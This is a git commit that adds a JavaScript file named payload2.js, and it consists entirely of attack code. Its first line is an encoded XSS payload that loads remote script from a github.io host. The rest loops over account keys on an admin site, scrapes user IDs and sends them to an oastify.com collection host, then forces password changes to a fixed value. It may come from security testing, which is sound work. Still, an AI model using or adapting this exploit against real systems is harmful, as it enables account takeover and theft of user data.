89cc3ce37897beba3fc00c0ad619019bbb9e4324
Yarterss <trey@inspectiv.com>
2025-02-26 10:23:55 -0600

    Add files via upload

---
+++ payload2.js
@@ -0,0 +1,20 @@
+%uff1cimg%20src=d%20onerror=import("https://tomoncrss.github.io/jsfile/payload.js")%uff1e
+
+
+
+
+for (let i = 199300; i <= 199301; i++) {
+  fetch(`https://pateng.erad.com/Admin/AdminUsers/Edit?aPatientKey=${i}`)
+    .then(res => res.text())
+    .then(res => {
+      let match = res.match(/id='UserIDText'>(.*?)<\/span>/);
+      if (match) {
+        fetch(`https://7v38ezsvngwu5goi5lsma1v25tbkzb4zt.oastify.com?data=${encodeURIComponent(match[1])}`);
+      }
+      return fetch("https://pateng.erad.com/Admin/AdminUsers/SavePasswordChange", {
+        method: "POST",
+        headers: { "Content-Type": "application/x-www-form-urlencoded" },
+        body: `aPatientKey=${i}&NewPassword=Test%40123%4012`
+      });
+    });
+}
